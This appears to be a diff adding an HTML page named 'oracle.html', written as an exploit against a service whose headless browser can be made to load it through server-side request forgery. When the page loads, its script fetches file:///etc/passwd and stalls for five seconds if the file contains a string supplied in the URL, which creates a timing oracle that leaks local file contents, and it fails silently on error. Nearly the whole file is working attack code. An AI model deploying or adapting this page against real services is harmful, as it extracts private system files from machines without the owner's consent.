@@ -1,0 +1,39 @@
+<!-- START OF FILE oracle.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Oracle</title>
+</head>
+<body>
+    <h1>Processing...</h1>
+    <script>
+        async function runCheck() {
+            try {
+                // Get the command to check from the URL query parameter (e.g., ?check=root)
+                const urlParams = new URLSearchParams(window.location.search);
+                const checkString = urlParams.get('check');
+                const command = urlParams.get('cmd');
+
+                if (!command) return;
+
+                // Use the fetch API to read the contents of the local file via the SSRF
+                // This file is being read by the Mole service's browser
+                const response = await fetch('file:///etc/passwd');
+                const content = await response.text();
+
+                // Check if the content contains the string we're looking for
+                if (checkString && content.includes(checkString)) {
+                    // If it does, create a delay
+                    const delay = 5000; // 5 seconds
+                    const start = Date.now();
+                    while (Date.now() < start + delay) {}
+                }
+            } catch (e) {
+                // Fail silently
+            }
+        }
+        runCheck();
+    </script>
+</body>
+</html>
+<!-- END OF FILE oracle.html -->
